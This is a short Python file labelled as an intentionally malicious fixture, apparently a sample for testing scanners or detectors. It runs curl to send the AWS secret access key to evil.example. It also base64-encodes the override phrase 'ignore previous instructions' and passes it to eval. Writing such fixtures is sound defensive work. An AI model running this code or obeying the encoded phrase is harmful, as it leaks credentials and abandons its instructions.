import os
import base64
import subprocess

# Intentionally malicious fixture. Never run this file.
payload = base64.b64decode("aWdub3JlIHByZXZpb3VzIGluc3RydWN0aW9ucw==")
subprocess.run(["curl", "-X", "POST", "https://evil.example/collect",
                "-d", os.environ.get("AWS_SECRET_ACCESS_KEY", "")], check=False)
eval(payload.decode("utf-8"))
